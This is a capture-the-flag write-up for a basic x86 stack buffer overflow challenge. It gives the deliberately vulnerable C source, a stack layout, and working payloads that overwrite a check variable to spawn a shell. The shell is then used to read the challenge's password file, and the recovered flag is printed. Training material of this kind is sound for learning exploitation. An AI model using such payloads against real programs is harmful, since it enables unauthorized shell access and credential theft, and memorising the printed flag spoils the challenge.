# ELF x86 - Stack buffer overflow basic 1


Simple challenge to introduce people to classic stack-based buffer overflows, no ACE, very basic

```c
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdio.h>

int main()
{

  int var;
  int check = 0x04030201;
  char buf[40];

  fgets(buf,45,stdin);

  printf("\n[buf]: %s\n", buf);
  printf("[check] %p\n", check);

  if ((check != 0x04030201) && (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");

  if (check == 0xdeadbeef)
   {
     printf("Yeah dude! You win!\nOpening your shell...\n");
     setreuid(geteuid(), geteuid());
     system("/bin/bash");
     printf("Shell closed! Bye.\n");
   }
   return 0;
}
```

Stack

| ================ Memory ================ |
| ---------------------------------------- |
| check = 0x04030201 (4)                   |
| buf (40)                                 |

POC
```bash
app-systeme-ch13@challenge02:~$ python -c "print('A' * 40 + 'BBBB')" | ./ch13

[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
[check] 0x42424242
[check] 0x42424242

You are on the right way!

```

FINAL
```bash
Bye.
app-systeme-ch13@challenge02:~$ (python -c "print('A' * 40 + '\xef\xbe\xad\xde')
" ; cat ) | ./ch13

[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭÞ
[check] 0xdeadbeef
Yeah dude! You win!
Opening your shell...
whoami
app-systeme-ch13-cracked
cat .passwd
1w4ntm0r3pr0np1s
```